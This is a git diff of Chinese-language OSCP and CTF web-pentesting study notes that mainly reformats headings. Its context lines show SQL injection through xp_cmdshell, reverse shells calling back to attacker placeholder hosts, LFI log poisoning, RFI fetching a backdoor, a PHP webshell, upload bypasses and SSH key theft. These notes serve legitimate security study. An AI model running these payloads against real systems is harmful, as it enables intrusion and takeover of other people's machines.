@@ -10,9 +10,7 @@ date: 2024-02-07
 
 <!-- more -->
 
-## 解題重點
-
-### Enum directory/dns
+## Enum directory/dns
 
 - DNS Enumeration (OSCP 常考): 標準記錄列舉：查 A、AAAA、MX、NS、SOA、TXT 等記錄
 
@@ -49,7 +47,7 @@ date: 2024-02-07
   $ ffuf -u http://192.168.198.48/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt # 會著重在特定的檔案類型
   ```
 
-### Information Leak
+## Information Leak
 
 - [`.DS_Store` - lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)
 - [`gitleak` - denny0223/scrabble](https://github.com/denny0223/scrabble): 確認有無`https://<victim url>/.git/config`
@@ -59,11 +57,11 @@ date: 2024-02-07
   $ ./scrabble http://example.com/my-project.git/
   ```
 
-### Injection
+## Injection
 
-#### SQLi
+### SQLi
 
-##### SQL 連線
+#### SQL 連線
 
 <details markdown="1">
 <summary><span class="spoiler">CMD</span></summary>
@@ -101,7 +99,7 @@ date: 2024-02-07
 
 </details>
 
-##### SQLi
+#### SQLi
 
 - 先確認哪裡是注入點，例如 GET 參數或是在 Burp 看哪裡有 POST
 - Union-Based: 有兩個前提
@@ -251,17 +249,17 @@ date: 2024-02-07
   <summary><span class="spoiler">Example</span></summary>
   - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
 
-    ```sql
-    -- 啟用 xp_cmdshell
-    $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
+  ```sql
+  -- 啟用 xp_cmdshell
+  $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
 
-    -- 執行命令
-    $ '; EXEC xp_cmdshell 'whoami'; --
+  -- 執行命令
+  $ '; EXEC xp_cmdshell 'whoami'; --
 
-    -- Reverse shell
-    $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
-    $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
-    ```
+  -- Reverse shell
+  $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
+  $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
+  ```
 
   - MySQL(INTO OUTFILE / UDF): FILE 權限 + secure_file_priv 沒有限制 + 知道 web 目錄絕對路徑
 
@@ -314,7 +312,7 @@ date: 2024-02-07
     - PSQLException / ERROR: syntax error at or near → PostgreSQL
     - ORA-xxxxx → Oracle
 
-##### 如何使用 SQLMAP
+#### SQLMAP
 
 - [ Day 4 很像走迷宮的 sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
 - [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好
@@ -438,7 +436,7 @@ date: 2024-02-07
 
     </details>
 
-#### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 
 <details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
@@ -455,7 +453,7 @@ date: 2024-02-07
 
 </details>
 
-#### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 <details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
@@ -593,7 +591,7 @@ fetch(`/getflag\)
 
 </details>
 
-#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
+### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
 
 <details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
@@ -627,7 +625,7 @@ fetch(`/getflag\)
 
 </details>
 
-#### Command Injection
+### Command Injection
 
 - [feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
@@ -685,7 +683,7 @@ fetch(`/getflag\)
 
     </details>
 
-### 讀擋
+## 讀擋
 
 可以讀的檔案
 
@@ -724,7 +722,7 @@ fetch(`/getflag\)
 
 </details>
 
-#### 利用讀檔案 → ssh 連線
+### 利用讀檔案 → ssh 連線
 
 - 試著讀取 `/home/<user>/.ssh/authorized_keys`: authorized_keys 裡每一行的開頭會寫 key 類型，像 `ecdsa-sha2-nistp256 AAAA...`，所以一看就知道要去讀哪個私鑰檔。如果寫的是 ssh-rsa，你就讀 `id_rsa`。
 - 並且 ssh 登入
@@ -740,7 +738,7 @@ fetch(`/getflag\)
   $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```
 
-#### LFI
+### LFI
 
 - 前提: 在 PHP 中需要特別啟用 `allow_url_include`
 - 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
@@ -793,7 +791,7 @@ fetch(`/getflag\)
 
   </details>
 
-#### 利用 LFI 拿 reverse shell
+### 利用 LFI 拿 reverse shell
 
 - PHP filter + base64（確認能讀檔）
 
@@ -834,7 +832,7 @@ bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
 $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22"
 ```
 
-#### RFI
+### RFI
 
 和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令
 
@@ -849,7 +847,7 @@ $ python3 -m http.server 80 # 建立一個 http server
 $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>/simple-backdoor.php&cmd=ls"
 ```
 
-### Deserialization
+## Deserialization
 
 <details markdown="1">
 <summary><span class="spoiler">暫時隱藏</span></summary>
@@ -875,11 +873,11 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
 
 </details>
 
-### Frontend
+## Frontend
 
 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部 server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
 
-### SSRF
+## SSRF
 
 <details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
@@ -895,7 +893,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 
 </details>
 
-### CSRF(Cross-Site Request Frogery)
+## CSRF(Cross-Site Request Frogery)
 
 <details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
@@ -927,7 +925,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 
 也就是他和 XSS 的其中一個目的有點像，那就是偷到使用者的 cookie/session，只是方式不同，一個是利用 javascript 的 injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種 request，如果該網站沒有對 user 進行額外的身份驗證，那們光靠 user cookie/session 就有機會達成轉帳、發文之類的操作
 
-#### 如何預防 CSRF
+### 如何預防 CSRF
 
 - CSRF Token: 這是最簡單的方式，既然 attacker 可以透過惡意網站得到 victim 的 cookie，那我就額外在 server side 多一個驗證 token 的步驟，而該 token 無論如何都不會被 attacker 利用惡意網站得知，就可以確保目前的 request 是不是本人，而為什麼 CSRF token 無法被 attacker 得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
 
@@ -949,7 +947,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 
 </details>
 
-### Upload
+## Upload
 
 - 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到 RCE
 - 改 Extension: 如果有保護但只看 extension : 那就偽造 extension 後夾帶 webshell 達到 RCE (`webshell.png.php`)
@@ -957,7 +955,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 - 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
 - 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload
 
-#### 利用 Upload + Directory Traversal 上傳 ssh pub key
+### 利用 Upload + Directory Traversal 上傳 ssh pub key
 
 - 最大的前提是: web server 是以 root 這種高權限運行，在使用自帶 web server 的程式語言（如 Go、Node.js、Python）中很常見，因為開發者或管理員為了省事，直接用 root 啟動應用來避免權限問題。相比之下，傳統的 web server 如 Apache 或 Nginx 通常以低權限使用者（如 www-data）運行，IIS 則用 Network Service 或 Application Pool Identity。這些帳號無法寫入 /root/ 目錄，所以同樣的攻擊就不會成功
 
@@ -1004,7 +1002,7 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
    root@704d6605d487:~#
    ```
 
-#### JSP
+### JSP
 
 如果是 JSP 系統，有以下幾個 Payload 可以試看看
 
@@ -1038,7 +1036,7 @@ $ cp /usr/share/webshells/php/simple-backdoor.php . # php
 $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 webshell
 ```
 
-### 如果是 WordPress 網頁
+## 如果是 WordPress 網頁
 
 起手式一定是用 wpscan 去掃 plugin 版本，查 exploit
 
